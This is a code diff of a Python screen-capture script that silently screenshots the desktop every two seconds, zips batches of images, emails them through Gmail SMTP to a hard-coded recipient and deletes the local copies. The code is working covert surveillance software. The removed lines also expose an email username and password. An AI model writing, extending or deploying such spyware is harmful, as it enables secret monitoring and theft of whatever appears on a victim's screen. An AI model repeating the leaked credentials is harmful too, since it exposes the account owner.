@@ -9,35 +9,36 @@ import mimetypes
 import email
 import email.mime.application
 import zipfile
-
+import os
 
 #default variables
 runState = True;
-fromaddr = 'anurag@gmail.com';
-username = 'anurag@techvalens.com'
-password = 'Anu123rag!!'
-toaddrs  = 'sanchay.shukla@techvalens.com'
-
+fromaddr = 'abc@gmail.com';
+username = 'sanchay.shukla@techvalens.com';
+password = 'abcd1234';
+toaddrs  = 'sanchay.shukla@techvalens.com';
+files = [];
 
 # Captures the screen 
 def captureScreen():
+	global files
 	timestr = time.strftime("%Y%m%d-%H%M%S");
 	ImageGrab.grab().save(timestr+'.jpg', "JPEG");
-	sendEmailWithAttachment(timestr+'.jpg');
+	files.append(timestr+'.jpg')
 	return
 
 
-# Send captured data on email
-def sendEmail():
-	
-	msg = 'There was a terrible error that occured and I wanted you to know!'
-
-	# The actual mail send
-	server = smtplib.SMTP('smtp.gmail.com:587')
-	server.starttls()
-	server.login(username,password)
-	server.sendmail(fromaddr, toaddrs, msg)
-	server.quit()	
+def ZipfileAndSendEmail():
+	global files
+	timestr = time.strftime("%Y%m%d-%H%M%S");
+	zipfilename = timestr+".zip";
+	z = zipfile.ZipFile(zipfilename, "a");
+	for file in files: 
+		z.write(file);
+		os.remove(file);
+	z.close();
+	files = []
+	sendEmailWithAttachment(zipfilename);
 	return
 
 def sendEmailWithAttachment(filename):
@@ -67,14 +68,19 @@ def sendEmailWithAttachment(filename):
 	s.login(username,password)
 	s.sendmail(fromaddr,toaddrs, msg.as_string())
 	s.quit()
+	os.remove(filename);
 	return
 	
 # start
 def start():
-	print runState;
+	sendZipFlag = 0;
 	while(runState):
 		time.sleep(2);
 		captureScreen();
+		sendZipFlag += 1;
+		if sendZipFlag == 10:
+			ZipfileAndSendEmail();
+			sendZipFlag = 0;
 	return
 
 start();
